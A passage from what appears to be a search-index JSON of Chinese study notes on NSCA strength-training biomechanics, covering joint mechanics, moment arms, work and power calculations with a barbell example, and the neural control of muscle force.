\u8098\u5173\u8282 \uff1a\u4e3b\u8981\u7528\u4e8e\u624b\u81c2\u7684\u7075\u6d3b\u8fd0\u52a8\uff0c\u5982\u6293\u53d6\u3001\u4e3e\u8d77\u7269\u4f53\u7b49\u3002\u8098\u5173\u8282\u4e0d\u9700\u8981\u627f\u53d7\u8eab\u4f53\u7684\u91cd\u91cf\uff0c\u66f4\u591a\u7684\u662f\u9700\u8981\u7075\u6d3b\u6027\u548c\u7cbe\u786e\u7684\u63a7\u5236\u3002 \u529b\u5b66\u9700\u6c42 \u819d\u5173\u8282\u7684\u529b\u5b66\u9700\u6c42 \uff1a\u5728\u819d\u5173\u8282\u4e2d\uff0c\u9acc\u9aa8\u901a\u8fc7\u589e\u52a0\u529b\u81c2\u957f\u5ea6\u6765\u63d0\u9ad8\u808c\u8089\u65bd\u529b\u7684\u6548\u7387\uff0c\u8fd9\u662f\u56e0\u4e3a\u819d\u5173\u8282\u9700\u8981\u5728\u627f\u53d7\u8f83\u5927\u8d1f\u8377\u65f6\u63d0\u4f9b\u6709\u6548\u7684\u8fd0\u52a8\u3002 \u8098\u5173\u8282\u7684\u529b\u5b66\u9700\u6c42 \uff1a\u8098\u5173\u8282\u7684\u4e3b\u8981\u529f\u80fd\u662f\u524d\u81c2\u7684\u5c48\u66f2\u548c\u4f38\u5c55\uff0c\u5728\u8fd9\u4e9b\u8fd0\u52a8\u4e2d\u5e76\u4e0d\u9700\u8981\u50cf\u819d\u5173\u8282\u90a3\u6837\u627f\u53d7\u5de8\u5927\u7684\u529b\u91cf\uff0c\u56e0\u6b64\u6ca1\u6709\u9acc\u9aa8\u8fd9\u6837\u7684\u7ed3\u6784\u4e5f\u662f\u5408\u7406\u7684\u3002 \u8fdb\u5316\u548c\u9002\u5e94 \u8fdb\u5316\u8fc7\u7a0b \uff1a\u5728\u8fdb\u5316\u8fc7\u7a0b\u4e2d\uff0c\u4eba\u4f53\u7ed3\u6784\u662f\u6839\u636e\u529f\u80fd\u9700\u6c42\u4f18\u5316\u7684\u3002\u819d\u5173\u8282\u4e3a\u4e86\u9002\u5e94\u76f4\u7acb\u884c\u8d70\u548c\u8dd1\u6b65\u7b49\u6d3b\u52a8\uff0c\u8fdb\u5316\u51fa\u4e86\u9acc\u9aa8\u6765\u63d0\u9ad8\u529b\u5b66\u6548\u7387\u3002 \u8098\u5173\u8282\u7684\u9002\u5e94\u6027 \uff1a\u8098\u5173\u8282\u5219\u66f4\u591a\u662f\u4e3a\u4e86\u9002\u5e94\u7075\u6d3b\u64cd\u4f5c\u3001\u7cbe\u7ec6\u63a7\u5236\u7b49\u529f\u80fd\uff0c\u56e0\u6b64\u5728\u8fdb\u5316\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u53d1\u5c55\u51fa\u7c7b\u4f3c\u9acc\u9aa8\u7684\u7ed3\u6784\u3002 \u7ed3\u6784\u548c\u8fd0\u52a8\u65b9\u5f0f \u819d\u5173\u8282 \uff1a\u4f5c\u4e3a\u4e00\u4e2a\u627f\u91cd\u5173\u8282\uff0c\u5176\u8fd0\u52a8\u65b9\u5f0f\u4e3b\u8981\u662f\u5c48\u66f2\u548c\u4f38\u5c55\uff0c\u540c\u65f6\u9700\u8981\u63d0\u4f9b\u7a33\u5b9a\u6027\uff0c\u56e0\u6b64\u9acc\u9aa8\u7684\u5b58\u5728\u662f\u5408\u7406\u7684\u3002 \u8098\u5173\u8282 \uff1a\u5176\u8fd0\u52a8\u65b9\u5f0f\u9664\u4e86\u5c48\u66f2\u548c\u4f38\u5c55\u5916\uff0c\u8fd8\u5305\u62ec\u65cb\u8f6c\uff08\u524d\u81c2\u7684\u65cb\u524d\u548c\u65cb\u540e\uff09\uff0c\u8fd9\u79cd\u590d\u6742\u7684\u8fd0\u52a8\u65b9\u5f0f\u8981\u6c42\u5173\u8282\u5177\u6709\u8f83\u9ad8\u7684\u7075\u6d3b\u6027\uff0c\u800c\u4e0d\u662f\u589e\u52a0\u989d\u5916\u7684\u9aa8\u7ed3\u6784\u3002 \u7531\u4e8e\u8eab\u4f53\u4e2d\u6760\u6746\u7684\u5e03\u5c40\u7279\u70b9\uff0c\u5927\u90e8\u5206\u9aa8\u9abc\u808c\u90fd\u4ee5\u5f88\u5927\u7684\u8d1f\u673a\u68b0\u6548\u7387\u5de5\u4f5c\u3002\u5728\u8fdb\u884c\u4f53\u80b2\u8fd0\u52a8\u6216\u5176\u4ed6\u8eab\u4f53\u6d3b\u52a8\u65f6\uff0c\u808c\u8089\u548c\u808c\u8171\u6240\u627f\u53d7\u7684\u529b\u8fdc\u5927\u4e8e\u624b\u811a\u65bd\u52a0\u4e8e\u5916\u90b5\u7269\u4f53\u6216\u5730\u9762\u4e0a\u7684\u529b\u3002","title":"\u4e3a\u4ec0\u4e48\u8098\u5173\u8282\u6ca1\u6709\u819d\u76d6\u9aa8\uff1f"},{"location":"soft/NSCA/#_54","text":"\u4eba\u4e0e\u4eba\u4e4b\u95f4\u7684\u89e3\u5256\u5b66\u7ed3\u6784\u5b58\u5728\u76f8\u5f53\u5927\u7684\u5dee\u5f02\uff0c\u5305\u62ec\u808c\u8171\u9644\u7740\u4e8e\u9aa8\u7684\u6b62\u70b9\u4f4d\u7f6e\u3002 \u8fd9\u5f20\u56fe\u5c55\u793a\u4e86\u80b1\u4e8c\u5934\u808c\u5728\u8098\u5173\u8282\u5c48\u66f2\u8fc7\u7a0b\u4e2d\u7684\u529b\u81c2\u53d8\u5316\u3002 \u56fe\u89e3\u5185\u5bb9 \uff1a \u56fe\u4e2d\u7684\u7bad\u5934\u8868\u793a\u80b1\u4e8c\u5934\u808c\u6536\u7f29\u65f6\u7684\u529b\u91cf\u65b9\u5411\u3002 \u529b\u81c2\uff08M\uff09\u8868\u793a\u4ece\u5173\u8282\u65cb\u8f6c\u8f74\u5230\u808c\u8171\u4f5c\u7528\u7ebf\u7684\u5782\u76f4\u8ddd\u79bb\u3002 \u529b\u81c2\u53d8\u5316 \uff1a \u5f53\u8098\u5173\u8282\u4ece\u4f38\u76f4\u5230\u5b8c\u5168\u5c48\u66f2\u65f6\uff0c\u529b\u81c2\uff08M\uff09\u9010\u6e10\u53d8\u77ed\u3002 \u529b\u81c2\u8d8a\u77ed\uff0c\u673a\u68b0\u6548\u7387\u8d8a\u4f4e\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u808c\u8089\u9700\u8981\u7528\u66f4\u591a\u7684\u529b\u91cf\u6765\u4ea7\u751f\u76f8\u540c\u7684\u8fd0\u52a8\u3002 \u808c\u8171\u6b62\u70b9\u4f4d\u7f6e\u7684\u5f71\u54cd \uff1a \u5982\u679c\u808c\u8171\u6b62\u70b9\u4f4d\u7f6e\u9760\u8fd1\u5173\u8282\uff0c\u529b\u81c2\u4f1a\u53d8\u77ed\uff0c\u673a\u68b0\u6548\u7387\u4f4e\uff0c\u4f46\u52a8\u4f5c\u901f\u5ea6\u5feb\u3002 \u5982\u679c\u808c\u8171\u6b62\u70b9\u4f4d\u7f6e\u8fdc\u79bb\u5173\u8282\uff0c\u529b\u81c2\u4f1a\u53d8\u957f\uff0c\u673a\u68b0\u6548\u7387\u9ad8\uff0c\u4f46\u52a8\u4f5c\u901f\u5ea6\u6162\u3002 \u5b9e\u9645\u5e94\u7528 \uff1a \u4e3e\u91cd\u65f6\uff0c\u808c\u8171\u6b62\u70b9\u4f4d\u7f6e\u8fdc\u7684\u4eba\u53ef\u4ee5\u4e3e\u8d77\u66f4\u91cd\u7684\u91cd\u91cf\uff0c\u56e0\u4e3a\u4ed6\u4eec\u7684\u529b\u81c2\u66f4\u957f\uff0c\u80fd\u4ea7\u751f\u66f4\u5927\u7684\u529b\u77e9\u3002 \u4f46\u8fd9\u79cd\u7ed3\u6784\u4e5f\u4f1a\u5bfc\u81f4\u52a8\u4f5c\u901f\u5ea6\u53d8\u6162\uff0c\u56e0\u4e3a\u808c\u8089\u9700\u8981\u6536\u7f29\u66f4\u591a\u6765\u5b8c\u6210\u540c\u6837\u7684\u5173\u8282\u89d2\u5ea6\u53d8\u5316\u3002","title":"\u808c\u8171\u4f4d\u7f6e\u5bfc\u81f4\u540c\u6837\u52a8\u4f5c\u7684\u6548\u7387\u4e0d\u540c"},{"location":"soft/NSCA/#_55","text":"\u56fe2.9\u5c55\u793a\u4e86\u4eba\u7ad9\u7acb\u65f6\u7684\u6807\u51c6\u89e3\u5256\u5b66\u7ecf\u52bf\u3002\u8eab\u4f53\u76f4\u7acb,\u53cc\u81c2\u81ea\u7136\u4e0b\u5782\u4e8e\u8eab\u4f53\u4e24\u4fa7,\u638c\u5fc3\u671d\u524d\u3002\u8eab\u4f53\u7684\u89e3\u5256\u89c6\u56fe,\u5982\u5728\u78c1\u5171\u632f\u6210\u50cf\u4e2d, \u901a\u5e38\u663e\u793a\u4e3a\u77e2\u72b6\u9762\u3001\u989d\u72b6\u9762\u548c\u6c34\u5e73\u9762\u3002\u4e09\u8005\u5206\u522b\u5c06\u8eab\u4f53\u5206\u6210\u5de6\u53f3\u3001\u524d\u540e\u548c\u4e0a\u4e0b\u90e8\u3001\u8fd9\u6837\u7684\u533a\u5206\u662f\u76f8\u5bf9\u6027\u7684,\u4e0d\u4e00\u5b9a\u5728\u6b63\u4e2d\u95f4\u3002","title":"\u89e3\u5228\u5e73\u9762\u548c\u4e3b\u8981\u8eab\u4f53\u8fd0\u52a8"},{"location":"soft/NSCA/#_56","text":"\u529b=\u8d28\u91cf\u00b7\u52a0\u901f\u5ea6 \u529f=\u529b\u00b7\u4f4d\u79fb \u529f\u7387=\u529f/\u65f6\u95f4 \u5728\u56fd\u9645\u5355\u4f4d\u5236(SI.\u7f29\u5199\u6765\u81ea\u6cd5\u8bed)\u4e2d * \u529b\u7684\u5355\u4f4d\u4e3a\u725b\u987f(N) * \u4f4d\u79fb\u7684\u5355\u4f4d\u662f\u7c73(m) * \u529f\u7684\u5355\u4f4d\u662f\u7126\u8033(J,\u5373N\u00b7m) * \u65f6\u95f4\u7684\u5355\u4f4d\u662f\u79d2(s) * \u529f\u7387\u7684\u5355\u4f4d\u662f\u74e6(W,\u5373J/s)\u3002 \u91cd\u590d10\u6b21\u5c06100kg\u7684\u6760\u94c3\u63d0\u8d772m\u7684\u505a\u529f\u8ba1\u7b97\u5982\u4e0b\u3002 \u6760\u94c3\u7684\u91cd\u529b\uff1a $$ F_1=9.8m\u00b2/s\\times 100kg\\times\\cos 0^\\circ =980N $$ \u7ed9\u54d1\u94c3\u79fb\u52a8\u7684\u529b\uff1a $$ F_2=2m\u00b2/s\\times100kg\\times\\cos 0^\\circ=200N $$ \u529f(\u6b63)= $$ (980N+200N)\\times2m\\times10=23600J $$ \u5047\u8bbe\u4e00\u7ec4\u52a8\u4f5c\u91cd\u590d10\u6b21\u9700\u898140s,\u8ba1\u7b97\u51fa\u8be5\u7ec4\u7684\u5e73\u5747\u8f93\u51fa\u529f\u7387(W): $$ \u529f\u7387(\u6b63)=\\frac {23600J}{40s}=590W $$","title":"\u6b63\u529f\u4e0e\u529f\u7387"},{"location":"soft/NSCA/#_57","text":"\u5f53\u529b\u7684\u65b9\u5411\u4e0e\u91cd\u7269\u79fb\u52a8\u7684\u65b9\u5411\u76f8\u53cd\u65f6\uff08\u5982\u63a7\u5236\u91cd\u7269\u7f13\u6162\u4e0b\u653e\uff09\uff0c\u8ba1\u7b97\u51fa\u7684\u529f\u548c\u529f\u7387\u90fd\u6709\u8d1f\u53f7\u3002\u6240\u6709\u7684\u201c\u8d1f\u201d\u529f\u548c\u529f\u7387\u90fd\u5728\u808c\u8089\u79bb\u5fc3\u52a8\u4f5c\u65f6\u4ea7\u751f\uff0c\u4f8b\u5982\u653e\u4e0b\u91cd\u7269\u548c\u5feb\u901f\u52a8\u4f5c\u7684\u5236\u52a8\u9636\u6bb5\u3002\u4e25\u683c\u6765\u8bf4\uff0c\u4e0d\u5b58\u5728\u8d1f\u7684\u529f\u548c\u529f\u7387\u3002\u672f\u8bed\u8d1f\u529f\u5b9e\u9645\u4e0a\u662f\u65bd\u52a0\u4e8e\u808c\u8089\u4f46\u4e0d\u662f\u901a\u8fc7\u808c\u8089\u53d1\u6325\u4f5c\u7528\u7684\u529f\u3002\u5f53\u91cd\u91cf\u88ab\u63d0\u8d77\u65f6\uff0c\u808c\u8089\u5bf9\u7269\u4f53\u505a\u529f\uff0c\u589e\u52a0\u7269\u4f53\u7684\u52bf\u80fd\u3002\u5f53\u91cd\u7269\u88ab\u653e\u4e0b\u65f6\uff0c\u5176\u52bf\u80fd\u88ab\u7528\u4e8e\u5bf9\u8fd0\u52a8\u5458\u505a\u540c\u6837\u91cf\u7ea7\u7684\u529f\u3002\u56e0\u6b64\uff0c\u91cd\u590d\u4e3e\u8d77\u548c\u653e\u4e0b\u7269\u4f53\u65f6\uff0c\u662f\u8fd0\u52a8\u5458\u548c\u7269\u4f53\u76f8\u4e92\u5411\u5bf9\u65b9\u505a\u529f\uff0c\u800c\u4e0d\u662f\u8fd0\u52a8\u5458\u5728\u91cd\u590d\u5730\u505a\u6b63\u529f\u548c\u8d1f\u529f\u3002\u52a8\u4f5c\u91cd\u590d\u7684\u901f\u5ea6\u51b3\u5b9a\u4e86\u8f93\u51fa\u529f\u7387\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6760\u94c3\u81ea\u7531\u843d\u4f53\u7684\u52a0\u901f\u5ea6\u662f9.8 m/s\u00b2\uff0c\u5982\u679c\u5bf9\u5176\u65bd\u52a0\u7684\u51c0\u529b\u662f980N\uff08F\uff09\uff0c\u90a3\u4e48\u52a0\u901f\u5ea6\u662f0 m/s\u00b2\u3002\u5982\u679c\u6211\u4eec\u5c11\u7528200N\u7684\u529b\uff0c\u5219\u6760\u94c3\u7684\u52a0\u901f\u5ea6\u5c06\u4e3a2 m/s\u00b2\uff08200N\u9664\u4ee5100kg\u5f97\u51fa\u5176\u52a0\u901f\u5ea6a\uff0ca = F/m\uff09\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u901a\u8fc7\u51cf\u5c0f\u65bd\u52a0\u7684\u529b\u6765\u63a7\u5236\u6760\u94c3\u4e0b\u843d\u7684\u52a0\u901f\u5ea6\u3002 $$ \u5047\u8bbe\u6760\u94c3\u91cd\u91cf\u4e3a100\u516c\u65a4\uff0c\u4e3a\u4f7f\u6760\u94c3\u4ee5\u52a0\u901f\u5ea62 m/s\u00b2\u4e0b\u843d\uff0c\u9700\u8981\u51cf\u5c11\u7684\u529bF_3\u8ba1\u7b97\u5982\u4e0b\uff1a $$ $$ F_3 = 2 \\, m/s \\times 100 \\, kg \\times \\cos 0^\\circ = 200 \\, N $$ $$ \u529f\uff08\u8d1f\uff09 = [ 980 \\, N + (-200 \\, N) ] \\times (-2 \\, m) \\times 10 = -15,600 \\, J $$ \u8fd9\u91cc980N\u662f\u91cd\u529b\u4f5c\u7528\u4e0b\u7684\u529b\uff0c200N\u662f\u51cf\u5c11\u7684\u529b\uff0c\u8d1f\u53f7\u8868\u793a\u65b9\u5411\u76f8\u53cd\u3002 \u8ba1\u7b97\u91cd\u590d10\u6b21\u4e0b\u653e\u52a8\u4f5c\u7684\u5e73\u5747\u8f93\u51fa\u529f\u7387\uff0c\u8fd9\u91cc\u603b\u65f6\u95f4\u4e3a40\u79d2\u3002 $$ \u529f\u7387\uff08\u8d1f\uff09 = \\frac{-15,600 \\, J}{40 \\, s} = -390 \\, W $$","title":"\u8d1f\u529f\u4e0e\u529f\u7387"},{"location":"soft/NSCA/#_58","text":"\u4ece\u79d1\u5b66\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u7206\u53d1\u529b\u548c\u529f\u7387\u662f\u540c\u4e00\u4e2a\u6982\u5ff5 \u529f\u7387 (Power) \uff1a\u5728\u7269\u7406\u5b66\u4e2d\uff0c\u529f\u7387\u662f\u6307\u5355\u4f4d\u65f6\u95f4\u5185\u505a\u7684\u529f\uff0c\u8ba1\u7b97\u516c\u5f0f\u662f\u529f\u7387=\u529b\u00d7\u901f\u5ea6\u3002 \u7206\u53d1\u529b \uff1a\u5728\u5065\u8eab\u548c\u8fd0\u52a8\u8bad\u7ec3\u4e2d\uff0c\u7206\u53d1\u529b\u901a\u5e38\u6307\u5728\u77ed\u65f6\u95f4\u5185\u5feb\u901f\u65bd\u52a0\u7684\u5927\u529b\u91cf\uff0c\u8fd9\u5b9e\u9645\u4e0a\u5c31\u662f\u9ad8\u529f\u7387\u3002 \u529b\u91cf\u548c\u7206\u53d1\u529b \uff1a \u529b\u91cf\u901a\u5e38\u4e0e\u4f4e\u901f\u8fd0\u52a8\u76f8\u5173\uff0c\u7206\u53d1\u529b\u4e0e\u5feb\u901f\u8fd0\u52a8\u76f8\u5173\u3002 \u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e24\u4e2a\u6982\u5ff5\u90fd\u6d89\u53ca\u5728\u7279\u5b9a\u901f\u5ea6\u4e0b\u65bd\u52a0\u529b\u7684\u80fd\u529b\u3002 \u529f\u7387\u662f\u529b\u91cf\u548c\u901f\u5ea6\u7684\u51fd\u6570\uff0c\u901a\u8fc7\u5df2\u77e5\u5176\u4e2d\u4e24\u4e2a\u53d8\u91cf\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7b2c\u4e09\u4e2a\u3002 \u8fd0\u52a8\u4e2d\u7684\u5e94\u7528 \uff1a \u529b\u91cf\u662f\u5728\u4efb\u4f55\u901f\u5ea6\u4e0b\u65bd\u52a0\u529b\u7684\u80fd\u529b\u3002 \u529f\u7387\u662f\u5728\u4efb\u4f55\u901f\u5ea6\u4e0b\u529b\u91cf\u548c\u901f\u5ea6\u7684\u4e58\u79ef\u3002 \u5728\u4e0d\u540c\u8fd0\u52a8\u4e2d\u65bd\u52a0\u529b\u7684\u901f\u5ea6\u548c\u963b\u529b\u4e0d\u540c\uff1a \u4f4e\u901f\u529b\u91cf\u5728\u9ad8\u963b\u529b\u3001\u4f4e\u901f\u5ea6\u8fd0\u52a8\u4e2d\u91cd\u8981\uff0c\u5982\u6a44\u6984\u7403\u4e2d\u7684\u5bf9\u6297\u3002 \u9ad8\u901f\u529b\u91cf\u5728\u4f4e\u963b\u529b\u3001\u9ad8\u901f\u5ea6\u8fd0\u52a8\u4e2d\u91cd\u8981\uff0c\u5982\u7fbd\u6bdb\u7403\u4e2d\u7684\u51fb\u7403\u3002","title":"\u529b\u91cf\u4e0e\u7206\u53d1\u529b"},{"location":"soft/NSCA/#_59","text":"\u795e\u7ecf\u63a7\u5236 \u795e\u7ecf\u7cfb\u7edf\u5bf9\u808c\u8089\u7684\u6fc0\u6d3b\u548c\u63a7\u5236\u662f\u5f71\u54cd\u529b\u91cf\u7684\u91cd\u8981\u56e0\u7d20\u3002\u901a\u8fc7\u795e\u7ecf\u5143\u7684\u534f\u8c03\u4f5c\u7528\uff0c\u80fd\u591f\u6709\u6548\u5730\u6fc0\u6d3b\u66f4\u591a\u7684\u808c\u7ea4\u7ef4\uff0c\u63d0\u5347\u529b\u91cf\u8f93\u51fa\u3002 \u808c\u8089\u6a2a\u622a\u9762\u79ef \u808c\u8089\u7684\u6a2a\u622a\u9762\u79ef\u8d8a\u5927\uff0c\u80fd\u4ea7\u751f\u7684\u529b\u91cf\u5c31\u8d8a\u5927\u3002\u8fd9\u662f\u56e0\u4e3a\u66f4\u591a\u7684\u808c\u7ea4\u7ef4\u80fd\u591f\u4ea7\u751f\u66f4\u5927\u7684\u603b\u6536\u7f29\u529b\u3002 \u808c\u7ea4\u7ef4\u6392\u5217 \u808c\u7ea4\u7ef4\u7684\u6392\u5217\u65b9\u5f0f\u5f71\u54cd\u529b\u91cf\u8f93\u51fa\u3002\u7fbd\u72b6\u808c\u7ea4\u7ef4\uff08\u5982\u80a1\u56db\u5934\u808c\uff09\u6392\u5217\u65b9\u5f0f\u80fd\u751f\u6210\u66f4\u5927\u7684\u529b\u91cf\uff0c\u800c\u5e73\u884c\u808c\u7ea4\u7ef4\uff08\u5982\u8153\u80a0\u808c\uff09\u66f4\u9002\u5408\u9ad8\u901f\u8fd0\u52a8\u3002 \u808c\u8089\u957f\u5ea6 \u808c\u8089\u5728\u6700\u4f73\u957f\u5ea6\uff08\u901a\u5e38\u662f\u4e2d\u95f4\u957f\u5ea6\uff09\u65f6\u80fd\u4ea7\u751f\u6700\u5927\u529b\u91cf\u3002\u8fc7\u957f\u6216\u8fc7\u77ed\u90fd\u4f1a\u5f71\u54cd\u529b\u91cf\u8f93\u51fa\u3002 \u5173\u8282\u89d2\u5ea6 \u5173\u8282\u7684\u89d2\u5ea6\u4f1a\u5f71\u54cd\u808c\u8089\u65bd\u529b\u7684\u6548\u679c\u3002\u5728\u67d0\u4e9b\u89d2\u5ea6\u4e0b\uff0c\u808c\u8089\u80fd\u591f\u66f4\u6709\u6548\u5730\u53d1\u529b\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u7684\u201c\u529b\u91cf\u66f2\u7ebf\u201d\u3002 \u808c\u8089\u6536\u7f29\u901f\u5ea6 \u529b\u91cf\u4e0e\u808c\u8089\u6536\u7f29\u901f\u5ea6\u5448\u53cd\u6bd4\u5173\u7cfb\u3002\u9ad8\u901f\u6536\u7f29\u65f6\u529b\u91cf\u8f93\u51fa\u8f83\u4f4e\uff0c\u4f4e\u901f\u6536\u7f29\u65f6\u529b\u91cf\u8f93\u51fa\u8f83\u9ad8\u3002\u8fd9\u662f\u56e0\u4e3a\u9ad8\u901f\u6536\u7f29\u65f6\uff0c\u808c\u7ea4\u7ef4\u65e0\u6cd5\u5b8c\u5168\u53c2\u4e0e\u53d1\u529b\u3002 \u5173\u8282\u89d2\u901f\u5ea6 \u5173\u8282\u7684\u65cb\u8f6c\u901f\u5ea6\u4e5f\u5f71\u54cd\u529b\u91cf\u8868\u73b0\u3002\u5728\u9ad8\u901f\u8fd0\u52a8\u4e2d\uff0c\u5173\u8282\u89d2\u901f\u5ea6\u8f83\u5927\uff0c\u800c\u529b\u91cf\u8f93\u51fa\u53ef\u80fd\u53d7\u9650\u3002 \u4f53\u578b \u4e2a\u4f53\u7684\u4f53\u578b\uff08\u5982\u8eab\u9ad8\u3001\u4f53\u91cd\u548c\u4f53\u8102\u6bd4\u4f8b\uff09\u4f1a\u5f71\u54cd\u529b\u91cf\u8868\u73b0\u3002\u8f83\u5927\u7684\u4f53\u578b\u901a\u5e38\u5177\u6709\u8f83\u5927\u7684\u808c\u8089\u8d28\u91cf\uff0c\u4f46\u8fc7\u9ad8\u7684\u4f53\u8102\u53ef\u80fd\u4e0d\u5229\u4e8e\u529b\u91cf\u6548\u7387\u3002","title":"\u4eba\u4f53\u529b\u91cf\u7684\u751f\u7269\u529b\u5b66\u56e0\u7d20"},{"location":"soft/NSCA/#_60","text":"\u795e\u7ecf\u7cfb\u7edf\u5bf9\u808c\u8089\u6700\u5927\u8f93\u51fa\u529b\u91cf\u7684\u63a7\u5236\u673a\u5236\u6d89\u53ca\u591a\u4e2a\u65b9\u9762\uff0c\u4ee5\u4e0b\u662f\u8be6\u7ec6\u89e3\u91ca\uff1a \u8fd0\u52a8\u5355\u4f4d\u6570\u91cf\u7684\u52df\u96c6 \u8fd0\u52a8\u5355\u4f4d \uff1a\u6307\u7684\u662f\u7531\u4e00\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u53ca\u5176\u6240\u652f\u914d\u7684\u6240\u6709\u808c\u7ea4\u7ef4\u7ec4\u6210\u7684\u529f\u80fd\u5355\u4f4d\u3002 \u52df\u96c6 \uff1a\u66f4\u591a\u7684\u8fd0\u52a8\u5355\u4f4d\u53c2\u4e0e\u808c\u8089\u6536\u7f29\uff0c\u610f\u5473\u7740\u53ef\u4ee5\u4ea7\u751f\u66f4\u5927\u7684\u529b\u91cf\u3002\u521d\u59cb\u8bad\u7ec3\u65f6\uff0c\u795e\u7ecf\u7cfb\u7edf\u4f1a\u5b66\u4e60\u5982\u4f55\u6fc0\u6d3b\u66f4\u591a\u7684\u8fd0\u52a8\u5355\u4f4d\u4ee5\u63d0\u5347\u529b\u91cf\u3002 \u8fd0\u52a8\u5355\u4f4d\u4f53\u79ef \u8fd0\u52a8\u5355\u4f4d\u4f53\u79ef \uff1a\u6307\u7684\u662f\u4e00\u4e2a\u8fd0\u52a8\u5355\u4f4d\u6240\u5305\u542b\u7684\u808c\u7ea4\u7ef4\u6570\u91cf\u3002 \u4f53\u79ef\u8d8a\u5927\uff0c\u529b\u91cf\u8d8a\u5927 \uff1a\u5927\u4f53\u79ef\u7684\u8fd0\u52a8\u5355\u4f4d\u80fd\u4ea7\u751f\u66f4\u5927\u7684\u529b\u91cf\uff0c\u56e0\u4e3a\u5b83\u4eec\u5305\u542b\u66f4\u591a\u7684\u808c\u7ea4\u7ef4\uff0c\u80fd\u591f\u4ea7\u751f\u66f4\u5927\u7684\u603b\u6536\u7f29\u529b\u3002 \u6fc0\u6d3b\u9891\u7387 \u6fc0\u53d1\u9891\u7387 \uff1a\u662f\u6307\u8fd0\u52a8\u795e\u7ecf\u5143\u53d1\u51fa\u795e\u7ecf\u51b2\u52a8\u7684\u9891\u7387\u3002 \u9891\u7387\u8d8a\u9ad8\uff0c\u529b\u91cf\u8d8a\u5927 \uff1a\u9ad8\u9891\u7387\u7684\u795e\u7ecf\u51b2\u52a8\u4f1a\u5bfc\u81f4\u808c\u7ea4\u7ef4\u66f4\u9891\u7e41\u5730\u6536\u7f29\uff0c\u589e\u52a0\u6574\u4f53\u529b\u91cf\u8f93\u51fa\u3002 \u6297\u963b\u8bad\u7ec3\u4e2d\u7684\u795e\u7ecf\u9002\u5e94 \u521d\u671f\u8fdb\u6b65 \uff1a\u529b\u91cf\u8bad\u7ec3\u521d\u671f\u7684\u8fdb\u6b65\u4e3b\u8981\u5f52\u56e0\u4e8e\u795e\u7ecf\u9002\u5e94\u3002\u5927\u8111\u548c\u795e\u7ecf\u7cfb\u7edf\u5b66\u4f1a\u4e86\u66f4\u6709\u6548\u5730\u6fc0\u6d3b\u808c\u7ea4\u7ef4\uff0c\u751a\u81f3\u5728\u808c\u8089\u672c\u8eab\u6ca1\u6709\u663e\u8457\u53d8\u5316\u7684\u60c5\u51b5\u4e0b\u4e5f\u80fd\u63d0\u5347\u529b\u91cf\u3002 \u65b0\u624b\u8bad\u7ec3\u53cd\u5e94 \uff1a\u521a\u5f00\u59cb\u529b\u91cf\u8bad\u7ec3\u7684\u65b0\u624b\u901a\u5e38\u4f1a\u5728\u6700\u521d\u51e0\u5468\u5185\u770b\u5230\u663e\u8457\u7684\u529b\u91cf\u63d0\u5347\uff0c\u8fd9\u4e3b\u8981\u662f\u56e0\u4e3a\u795e\u7ecf\u9002\u5e94\uff0c\u800c\u4e0d\u662f\u808c\u8089\u7684\u7269\u7406\u53d8\u5316\u3002 \u957f\u671f\u8bad\u7ec3\u6548\u679c \u6e10\u8fdb\u6027 \uff1a\u968f\u7740\u8bad\u7ec3\u7684\u7ee7\u7eed\uff0c\u529b\u91cf\u63d0\u5347\u7684\u901f\u5ea6\u4f1a\u51cf\u6162\u3002\u8fd9\u662f\u56e0\u4e3a\u521d\u671f\u7684\u795e\u7ecf\u9002\u5e94\u5df2\u8fbe\u5230\u4e00\u5b9a\u7a0b\u5ea6\uff0c\u8fdb\u4e00\u6b65\u7684\u8fdb\u6b65\u9700\u8981\u4f9d\u8d56\u4e8e\u808c\u8089\u7684\u7269\u7406\u53d8\u5316\uff0c\u5982\u808c\u8089\u80a5\u5927\uff08\u808c\u8089\u6a2a\u622a\u9762\u79ef\u589e\u52a0\uff09\u3002 \u808c\u8089\u80a5\u5927 \uff1a\u6301\u7eed\u8bad\u7ec3\u5c06\u5bfc\u81f4\u808c\u8089\u7ea4\u7ef4\u589e\u7c97\uff08\u80a5\u5927\uff09\uff0c\u8fd9\u4f1a\u5e26\u6765\u66f4\u5927\u7684\u529b\u91cf\u3002 \u65b0\u624b\u8bad\u7ec3\u7684\u5fc3\u6001\u7ba1\u7406 \u8010\u5fc3\u548c\u575a\u6301 \uff1a\u65b0\u624b\u5728\u8bad\u7ec3\u521d\u671f\u770b\u5230\u8fdb\u6b65\u51cf\u7f13\u540e\uff0c\u53ef\u80fd\u4f1a\u611f\u5230\u6cae\u4e27\u3002\u4f46\u91cd\u8981\u7684\u662f\u8981\u8ba4\u8bc6\u5230\uff0c\u529b\u91cf\u7684\u8fdb\u4e00\u6b65\u63d0\u9ad8\u5c06\u901a\u8fc7\u66f4\u6162\u4f46\u7a33\u5b9a\u7684\u8fc7\u7a0b\u5b9e\u73b0\uff0c\u5982\u808c\u8089\u80a5\u5927\u3002 \u957f\u671f\u76ee\u6807 \uff1a\u4fdd\u6301\u957f\u671f\u8bad\u7ec3\u8ba1\u5212\u7684\u575a\u6301\uff0c\u6700\u7ec8\u4f1a\u770b\u5230\u663e\u8457\u7684\u529b\u91cf\u548c\u808c\u8089\u4f53\u79ef\u7684\u589e\u52a0\u3002","title":"\u795e\u7ecf\u63a7\u5236"},{"location":"soft/NSCA/#_61","text":"\u6a2a\u622a\u9762\u79ef \uff1a\u808c\u8089\u80fd\u65bd\u52a0\u7684\u529b\u91cf\u4e3b\u8981\u4e0e\u5176\u6a2a\u622a\u9762\u79ef\u6709\u5173\uff0c\u800c\u4e0d\u662f\u808c\u8089\u7684\u603b\u4f53\u79ef\u3002 \u76f8\u540c\u6a2a\u622a\u9762\u79ef 